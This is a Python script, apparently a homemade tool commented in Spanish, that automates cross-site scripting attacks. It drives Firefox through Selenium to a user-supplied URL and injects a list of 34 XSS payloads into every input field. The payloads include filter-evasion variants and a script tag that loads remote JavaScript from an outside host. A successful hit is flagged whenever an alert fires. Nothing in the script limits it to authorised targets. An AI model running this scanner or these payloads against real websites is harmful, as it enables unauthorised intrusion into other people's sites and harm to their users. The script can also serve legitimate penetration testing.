import time
import logging
import pyfiglet
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    NoSuchElementException,
    StaleElementReferenceException,
    TimeoutException,
    UnexpectedAlertPresentException
)
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# Configuración de logging (redirigir errores a archivo)
logging.basicConfig(
    filename="xss_scanner.log",
    filemode="w",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

# Payloads para XSS
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input type='text' value=\"\"><script>alert('XSS')</script>",
    "<a href='javascript:alert(`XSS`)'>Click me</a>",
    "<script>document.write('<img src=x onerror=alert(\"XSS\")>')</script>",
    "<video><source onerror='javascript:alert(1)'>",
    "<details open ontoggle=alert(1)>",
    "<math><mtext><iframe onload=alert(1)>",
    "<marquee onstart=alert(1)>test</marquee>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<b onmouseover=alert(1)>hover me</b>",
    "<p onmousedown=alert(1)>click me</p>",
    "<input autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
    "<!--<script>--><script>alert(1)</script>",
    "<script src=data:text/javascript,alert(1)></script>",
    "'';!--\"<XSS>=&{()}",
    "1\"><script>alert(1)</script>",
    "1';alert(1)//",
    "1\";alert(1)//",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=\"javascript:alert(String.fromCharCode(88,83,83))\">",
    "><script>alert(/XSS/)</script>",
    "><img src=x onerror=alert(/XSS/)>",
    "<svg><script>alert(1)</script></svg>",
    "<script src=https://xss.rocks/xss.js></script>"
]

def banner():
    """
    Muestra un banner llamativo en la terminal.
    """
    ascii_banner = pyfiglet.figlet_format("XSS SCANNER", font="slant")
    made_by = pyfiglet.figlet_format("Made by Noon3", font="block")
    
    print(Fore.CYAN + Style.BRIGHT + ascii_banner)  # Banner en color cian
    print(Fore.MAGENTA + Style.BRIGHT + made_by)  # "Made by Noon3" en morado

def detect_xss(url):
    """
    Escanea la URL en busca de vulnerabilidades XSS.
    """
    logging.info("Escaneando la página web en busca de vulnerabilidades...")
    print(Fore.YELLOW + "Escaneando la página web en busca de vulnerabilidades...")

    # Configurar Selenium con Firefox en modo visible
    options = webdriver.FirefoxOptions()
    driver = webdriver.Firefox(options=options)
    wait = WebDriverWait(driver, 10)

    try:
        driver.get(url)
        time.sleep(2)

        input_fields = driver.find_elements(By.TAG_NAME, "input")
        if not input_fields:
            logging.warning("No se encontraron campos de entrada en la página.")
            print(Fore.RED + "⚠ No se encontraron campos de entrada en la página.")
            return

        for input_field in input_fields:
            field_name = input_field.get_attribute("name") or "campo_sin_nombre"
            logging.info(f"Probando campo: {field_name}")
            print(Fore.BLUE + f"🔍 Probando campo: {field_name}")

            for payload in XSS_PAYLOADS:
                retries = 3  # Intentar 3 veces si el elemento se vuelve stale
                while retries > 0:
                    try:
                        # Reubicar el campo antes de cada interacción
                        input_field = wait.until(EC.presence_of_element_located((By.NAME, field_name)))
                        driver.execute_script("arguments[0].scrollIntoView();", input_field)  # Hacer scroll al campo
                        input_field.clear()
                        input_field.send_keys(payload)
                        time.sleep(1)  # Dar tiempo para la escritura

                        # Intentar encontrar un botón de envío
                        submit_buttons = driver.find_elements(By.XPATH, "//button[@type='submit'] | //input[@type='submit']")
                        if submit_buttons:
                            driver.execute_script("arguments[0].scrollIntoView();", submit_buttons[0])  # Scroll al botón
                            submit_buttons[0].click()
                        else:
                            input_field.send_keys(Keys.RETURN)

                        time.sleep(2)  # Esperar la carga de la página

                        # Verificar si aparece una alerta (posible XSS detectado)
                        try:
                            alert = wait.until(EC.alert_is_present())
                            logging.warning(f"🔥 ¡XSS DETECTADO! Campo: '{field_name}', Payload: {payload}")
                            print(Fore.RED + f"🔥 ¡XSS DETECTADO! Campo: '{field_name}', Payload: {payload}")
                            alert.accept()  # Cerrar alerta

                        except TimeoutException:
                            logging.info(f"No se detectó XSS en '{field_name}' con este payload.")
                            print(Fore.GREEN + f"✅ No se detectó XSS en '{field_name}' con este payload.")

                        break  # Si no hubo errores, salir del bucle de reintentos

                    except StaleElementReferenceException:
                        logging.warning(f"El campo '{field_name}' se volvió inaccesible. Reintentando...")
                        retries -= 1  # Reducir el número de intentos restantes
                        time.sleep(1)  # Esperar antes de reintentar

                if retries == 0:
                    logging.error(f"No se pudo interactuar con el campo '{field_name}' después de varios intentos.")

    except Exception as e:
        logging.error(f"Error inesperado: {e}")  # Redirigir error a archivo
    finally:
        driver.quit()
        print(Fore.CYAN + "✅ Escaneo finalizado. Revisa 'xss_scanner.log' para detalles.")
        logging.info("Escaneo finalizado.")

if __name__ == "__main__":
    banner()
    target_url = input(Fore.YELLOW + "Introduce la URL de la página web para escanear: ")
    detect_xss(target_url)
